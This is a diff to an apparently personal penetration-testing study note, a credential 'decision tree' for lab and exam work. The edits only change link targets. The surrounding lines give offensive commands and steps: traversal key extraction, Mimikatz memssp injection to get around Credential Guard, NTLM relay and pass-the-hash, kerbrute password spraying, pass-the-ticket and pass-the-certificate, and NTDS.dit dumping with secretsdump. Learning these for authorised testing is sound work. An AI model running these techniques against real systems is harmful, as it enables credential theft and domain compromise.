@@ -12,12 +12,12 @@ Part of [[DECISION TREE]]. "I found X, what do I try" for credentials, hashes, a
 curl -s "<vulnerable-url>" -o raw_response.txt
 sed -n '/-----BEGIN.../,/-----END.../p' raw_response.txt > secret_file
 ```
-→ Full reasoning: [[Common Web Application Attacks#9.1.2. Identifying and Exploiting Directory Traversals|9.1.2]]
+→ Full reasoning: [[09. Common Web Application Attacks#9.1.2. Identifying and Exploiting Directory Traversals|9.1.2]]
 
 ### SSH key fails to load with a vague "unsupported"/"can't parse this" error
 → Don't jump to OpenSSL-compatibility theories first. Re-extract the key mechanically (see above) and `diff` it against your original copy. Corruption from manual copy/paste is the more common cause
 → If two independent tools (e.g. `ssh-keygen` and `puttygen`) both reject the same file, that's the tell it's the file, not the library
-→ Full story: [[Common Web Application Attacks#9.1.2. Identifying and Exploiting Directory Traversals|9.1.2 troubleshooting box]]
+→ Full story: [[09. Common Web Application Attacks#9.1.2. Identifying and Exploiting Directory Traversals|9.1.2 troubleshooting box]]
 
 ---
 
@@ -37,7 +37,7 @@ sed -n '/-----BEGIN.../,/-----END.../p' raw_response.txt > secret_file
 - CANNOT be passed directly -- it's a challenge-response tied to one session, not a reusable secret
 - Try cracking first. If rockyou + best66 + rockyou-30000 all fail or take too long: relay instead
 
-→ Full comparison: [[Password Attacks#16.3.3. Cracking Net-NTLMv2|16.3.3]] and [[Password Attacks#16.3.2. Passing NTLM|16.3.2]]
+→ Full comparison: [[16. Password Attacks#16.3.3. Cracking Net-NTLMv2|16.3.3]] and [[16. Password Attacks#16.3.2. Passing NTLM|16.3.2]]
 
 ---
 
@@ -57,7 +57,7 @@ Get-ComputerInfo | Select-Object DeviceGuardSecurityServicesRunning
 → Standard Mimikatz hash extraction is blocked for domain accounts
 → Use `misc::memssp` to inject a malicious SSP that intercepts credentials at the SSPI layer BEFORE Credential Guard encrypts them
 → Wait for (or coerce) a new authentication event, then read `C:\Windows\System32\mimilsa.log`
-→ Full walkthrough: [[Password Attacks#16.3.5. Windows Credential Guard|16.3.5]]
+→ Full walkthrough: [[16. Password Attacks#16.3.5. Windows Credential Guard|16.3.5]]
 
 ---
 
@@ -66,7 +66,7 @@ Get-ComputerInfo | Select-Object DeviceGuardSecurityServicesRunning
 → The relayed user is not a local admin on the relay target. Relay only gives you code execution if the authenticated user has local admin rights on the TARGET machine.
 → Check: is there another target where this user IS local admin? Enumerate other machines on the network.
 → Fallback: if you can dump the SAM on the source machine (schtask workaround), get the user's raw NTLM hash and PtH directly -- achieves the same access without needing the relay to succeed.
-→ Full story: [[Password Attacks#16.3.4. Relaying Net-NTLMv2|16.3.4 VM Group 1]]
+→ Full story: [[16. Password Attacks#16.3.4. Relaying Net-NTLMv2|16.3.4 VM Group 1]]
 
 ---
 
@@ -84,7 +84,7 @@ Get-ComputerInfo | Select-Object DeviceGuardSecurityServicesRunning
 → Try forward-slash UNC form first: `//kali-ip/share/file` instead of `\\kali-ip\share\file`
 → On Go's `filepath.Join(uploadDir, filename)` on Windows: `//server/` is treated as an absolute UNC path discarding uploadDir. Backslash form may be filtered; forward slashes often aren't.
 → Confirm the server does minimal path sanitisation first: `curl http://<target>/nul` → 200 OK (Windows NUL device passes through), `curl http://<target>/aux` → hangs (AUX serial port device). If both fire, the handler isn't sanitising device names, making UNC injection likely viable.
-→ Full story: [[Password Attacks#16.3.3. Cracking Net-NTLMv2|16.3.3 VM #2]]
+→ Full story: [[16. Password Attacks#16.3.3. Cracking Net-NTLMv2|16.3.3 VM #2]]
 
 ---
 
@@ -105,7 +105,7 @@ kerbrute userenum -d <domain> --dc <DC-IP> candidate_users.txt
 ```bash
 kerbrute bruteuser -d <domain> --dc <DC-IP> valid_users.txt 'Password123!'
 ```
-→ Full reference: [[Password Attacks (HTB Supplementary)#PA.20 kerbrute. Kerberos Username Enumeration & Spray|PA.20]], [[Password Attacks (HTB Supplementary)#PA.21 username-anarchy|PA.21]]
+→ Full reference: [[16. Password Attacks|PA.20]], [[16. Password Attacks|PA.21]]
 
 ---
 
@@ -128,7 +128,7 @@ smbclient -k -N //target/share     # use it (no password needed)
 If you have a `.keytab` instead of a `.ccache`: extract with `keytabextract.py <file.keytab>`, then `kinit <user>@DOMAIN` to get a TGT.
 
 → Key rule: TGTs let you request any TGS (full impersonation); a TGS only works for the single service it was issued for.
-→ Full reference: [[Password Attacks (HTB Supplementary)#PA.15 Pass the Ticket. Windows|PA.15]], [[Password Attacks (HTB Supplementary)#PA.16 Pass the Ticket. Linux|PA.16]]
+→ Full reference: [[16. Password Attacks|PA.15]], [[16. Password Attacks|PA.16]]
 
 ---
 
@@ -152,7 +152,7 @@ export KRB5CCNAME=out.ccache
 evil-winrm -i <target> -r <domain>
 ```
 → Prerequisite: oscrypto version pin may be needed (`pip3 install oscrypto==1.3.0`) if you get `ValueError: required TLS connection info not available`.
-→ Full reference: [[Password Attacks (HTB Supplementary)#PA.17 Pass the Certificate (PtC)|PA.17]]
+→ Full reference: [[16. Password Attacks|PA.17]]
 
 ---
 
@@ -171,6 +171,6 @@ Then exfil both files and crack offline:
 secretsdump.py -ntds NTDS.dit -system SYSTEM LOCAL
 ```
 → Alternative (remote, one-liner): `nxc smb <target> -u admin -p pass --ntds` runs VSS automatically.
-→ Full reference: [[Password Attacks (HTB Supplementary)#PA.13 NTDS.dit via Volume Shadow Copy|PA.13]]
+→ Full reference: [[16. Password Attacks|PA.13]]
 
 #### Tags: #DecisionTree #Credentials #PassTheTicket #PassTheCertificate #NTDS #kerbrute #ActiveDirectory
